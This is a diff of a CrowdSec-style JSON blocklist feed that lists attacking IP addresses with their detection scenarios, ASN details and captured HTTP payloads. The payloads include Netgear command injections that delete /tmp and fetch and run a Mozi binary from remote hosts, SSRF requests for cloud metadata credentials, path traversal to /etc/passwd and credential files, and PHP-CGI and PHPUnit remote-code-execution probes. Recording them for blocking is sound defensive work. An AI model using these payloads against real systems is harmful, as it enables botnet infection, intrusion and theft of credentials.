@@ -1,207 +1,13 @@
 {
-  "generated_at": "2026-09-27T01:00:00Z",
+  "generated_at": "2026-09-27T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 83,
-    "v4": 83,
+    "total": 77,
+    "v4": 77,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "202.163.102.169",
-      "family": "v4",
-      "first_seen": "2026-09-09T17:00:00Z",
-      "last_seen": "2026-09-20T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "202.163.102.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://202.163.102.169:45267/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.163.102.169:45267/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "104.199.221.96",
-      "family": "v4",
-      "first_seen": "2026-09-10T16:00:00Z",
-      "last_seen": "2026-09-20T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files",
-        "crowdsec/http-technology-probing",
-        "suricata/ET WEB_SERVER Likely Malicious Request for /proc/self/environ"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "104.199.208.0/20",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /phpinfo.php",
-        "GET /api/webhook?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
-        "GET /azure.json",
-        "GET /preview?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
-        "GET /.cursor/mcp.json",
-        "GET /@fs/proc/1/environ?import&raw??",
-        "GET /screenshot?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
-        "GET /static../.env",
-        "GET /media../.env",
-        "GET /.env",
-        "GET /app/.env",
-        "GET /static../.aws/credentials",
-        "GET /",
-        "GET /__aws_leak_probe_008c7960__",
-        "GET /@fs/proc/self/environ",
-        "GET /static../etc/passwd",
-        "GET /.azure/credentials",
-        "GET /@fs/root/.config/gcloud/application_default_credentials.json?raw??",
-        "GET /media../etc/passwd",
-        "GET /@fs/etc/passwd?raw??",
-        "GET /@fs/proc/self/environ?raw??",
-        "GET /@fs/etc/passwd?import&raw??",
-        "GET /assets../../../etc/passwd",
-        "GET /files../etc/passwd"
-      ]
-    },
-    {
-      "ip": "34.26.19.30",
-      "family": "v4",
-      "first_seen": "2026-09-12T23:00:00Z",
-      "last_seen": "2026-09-20T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-dos-swithcing-ua",
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files",
-        "crowdsec/http-technology-probing",
-        "suricata/ET WEB_SERVER /etc/passwd Detected in URI"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.26.0.0/16",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /phpinfo.php",
-        "GET /app_dev.php/_profiler/phpinfo",
-        "GET /api/webhook?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
-        "GET /azure.json",
-        "GET /preview?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
-        "GET /screenshot?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F",
-        "GET /azure-credentials.json",
-        "GET /@fs/proc/1/environ?import&raw??",
-        "GET /static../.env",
-        "GET /media../.env",
-        "GET /.env.local",
-        "GET /.env",
-        "GET /app/.env",
-        "GET /",
-        "GET /__aws_leak_probe_f2e665e7__",
-        "GET /media../etc/passwd",
-        "GET /files../etc/passwd",
-        "GET /etc/passwd",
-        "GET /@fs/root/.aws/credentials?raw??",
-        "GET /@fs/root/.config/gcloud/application_default_credentials.json?raw??",
-        "GET /@fs/proc/self/environ",
-        "GET /static../etc/passwd",
-        "GET /@fs/etc/passwd?import&raw??",
-        "GET /assets../../../etc/passwd",
-        "GET /@fs/proc/self/environ?raw??",
-        "GET /@fs/etc/passwd?raw??"
-      ]
-    },
-    {
-      "ip": "4.150.191.40",
-      "family": "v4",
-      "first_seen": "2026-09-14T18:00:00Z",
-      "last_seen": "2026-09-20T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing",
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "4.144.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /manager/html"
-      ]
-    },
-    {
-      "ip": "202.47.46.57",
-      "family": "v4",
-      "first_seen": "2026-09-16T11:00:00Z",
-      "last_seen": "2026-09-20T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "202.47.46.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://202.47.46.57:56597/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "103.116.137.186",
-      "family": "v4",
-      "first_seen": "2026-09-18T10:00:00Z",
-      "last_seen": "2026-09-20T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "134922",
-      "asn_name": "RGTECHNOSOLUTIONS-AS - R G TECHNOSOLUTIONS PVT LTD",
-      "asn_prefix": "103.116.136.0/23",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://70.70.22.128:55807/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://70.70.22.128:55807/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
     {
       "ip": "199.45.154.71",
       "family": "v4",
@@ -222,142 +28,6 @@
       "payloads": [
         "GET /",
         "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "159.223.40.65",
-      "family": "v4",
-      "first_seen": "2026-09-20T12:00:00Z",
-      "last_seen": "2026-09-20T12:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "159.223.32.0/20",
-      "payloads": [
-        "GET /wp-content/plugins/plugins/cache.php",
-        "GET /assets/images/images/cache.php",
-        "GET /images/images/cache.php",
-        "GET /cgi-bin/cgi-bin/cgi-bin/cgi-bin/cache.php"
-      ]
-    },
-    {
-      "ip": "153.75.249.211",
-      "family": "v4",
-      "first_seen": "2026-09-20T11:00:00Z",
-      "last_seen": "2026-09-20T11:00:00Z",
-      "scenarios": [
-        "crowdsec/CVE-2017-9841",
-        "crowdsec/http-probing",
-        "crowdsec/thinkphp-cve-2018-20062"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "19318",
-      "asn_name": "IS-AS-1 - Interserver, Inc",
-      "asn_prefix": "153.75.224.0/19",
-      "payloads": [
-        "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello",
-        "POST /bin/sh",
-        "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
-        "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
-        "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
-        "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
-        "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
-        "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
-        "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
-        "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php",
-        "GET /vendor/phpunit/Util/PHP/eval-stdin.php",
-        "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php"
-      ]
-    },
-    {
-      "ip": "152.42.253.169",
-      "family": "v4",
-      "first_seen": "2026-09-20T11:00:00Z",
-      "last_seen": "2026-09-20T11:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "152.42.240.0/20",
-      "payloads": [
-        "GET /blogs/media/media/cache.php",
-        "GET /cache/cache/cache.php",
-        "GET /images/images/cache.php",
-        "GET /cgi-bin/cgi-bin/cgi-bin/cgi-bin/cache.php"
-      ]
-    },
-    {
-      "ip": "66.132.224.80",
-      "family": "v4",
-      "first_seen": "2026-09-20T09:00:00Z",
-      "last_seen": "2026-09-20T09:00:00Z",
-      "scenarios": [
-        "crowdsec/http-bad-user-agent"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "398324",
-      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
-      "asn_prefix": "66.132.224.0/24",
-      "payloads": [
-        "GET /",
-        "GET /debug/pprof/"
-      ]
-    },
-    {
-      "ip": "34.51.255.189",
-      "family": "v4",
-      "first_seen": "2026-09-20T07:00:00Z",
-      "last_seen": "2026-09-20T07:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files",
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "34.51.128.0/17",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /phpinfo.php.save",
-        "GET /service-account.json",
-        "GET /sa.json",
-        "GET /gcp-key.json",
-        "GET /gcp-credentials.json",
-        "GET /info.php",
-        "GET /admin/.env",
-        "GET /admin-panel/.env",
-        "GET /administrator/.env",
-        "GET /",
-        "GET /.git/config",
-        "GET /.env",
-        "GET /.env.local",
-        "GET /.env.production",
-        "GET /.env.staging",
-        "GET /.env.development",
-        "GET /.env.test",
-        "GET /.env.remote",
-        "GET /.env.bak",
-        "GET /.env.backup"
       ]
     },
     {
@@ -2424,6 +2094,148 @@
       "asn_prefix": "80.66.85.0/24",
       "payloads": [
         "GET /web/login"
+      ]
+    },
+    {
+      "ip": "178.128.90.90",
+      "family": "v4",
+      "first_seen": "2026-09-27T12:00:00Z",
+      "last_seen": "2026-09-27T12:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "178.128.80.0/20",
+      "payloads": [
+        "GET /images/images/cache.php",
+        "GET /cgi-bin/cgi-bin/cgi-bin/cgi-bin/cache.php"
+      ]
+    },
+    {
+      "ip": "138.68.139.228",
+      "family": "v4",
+      "first_seen": "2026-09-27T09:00:00Z",
+      "last_seen": "2026-09-27T09:00:00Z",
+      "scenarios": [
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "138.68.128.0/20",
+      "payloads": [
+        "HEAD /web/",
+        "HEAD /home/",
+        "HEAD /de/",
+        "HEAD /cms/",
+        "HEAD /",
+        "HEAD /media/",
+        "HEAD /2024/",
+        "HEAD /press/",
+        "HEAD /blog/",
+        "HEAD /backup/",
+        "HEAD /old/",
+        "HEAD /2023/"
+      ]
+    },
+    {
+      "ip": "156.233.34.29",
+      "family": "v4",
+      "first_seen": "2026-09-27T08:00:00Z",
+      "last_seen": "2026-09-27T08:00:00Z",
+      "scenarios": [
+        "crowdsec/CVE-2017-9841",
+        "crowdsec/http-probing",
+        "crowdsec/thinkphp-cve-2018-20062"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "211961",
+      "asn_name": "HEDEF-HOSTING HEDEF GLOBAL BILISIM TEKNOLOJILERI SANAYI TICARET LIMITED SIRKETI",
+      "asn_prefix": "156.233.34.0/24",
+      "payloads": [
+        "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello",
+        "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
+        "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
+        "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php",
+        "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /phpunit/phpunit/Util/PHP/eval-stdin.php",
+        "GET /phpunit/src/Util/PHP/eval-stdin.php"
+      ]
+    },
+    {
+      "ip": "23.94.192.15",
+      "family": "v4",
+      "first_seen": "2026-09-27T05:00:00Z",
+      "last_seen": "2026-09-27T05:00:00Z",
+      "scenarios": [
+        "crowdsec/CVE-2017-9841",
+        "crowdsec/http-probing",
+        "crowdsec/thinkphp-cve-2018-20062"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "401443",
+      "asn_name": "WAP-AC - WAP.AC LLC",
+      "asn_prefix": "23.94.192.0/24",
+      "payloads": [
+        "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello",
+        "POST /bin/sh",
+        "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+        "POST /?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+        "POST /index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
+        "POST /test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input",
+        "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
+        "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/Util/PHP/eval-stdin.php",
+        "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php"
+      ]
+    },
+    {
+      "ip": "68.183.153.30",
+      "family": "v4",
+      "first_seen": "2026-09-27T01:00:00Z",
+      "last_seen": "2026-09-27T01:00:00Z",
+      "scenarios": [
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "68.183.144.0/20",
+      "payloads": [
+        "HEAD /de/",
+        "HEAD /store/",
+        "HEAD /cms/",
+        "HEAD /media/",
+        "HEAD /wp/",
+        "HEAD /website/",
+        "HEAD /site1/",
+        "HEAD /2024/",
+        "HEAD /us/",
+        "HEAD /main/",
+        "HEAD /press/",
+        "HEAD /old/"
       ]
     }
   ]
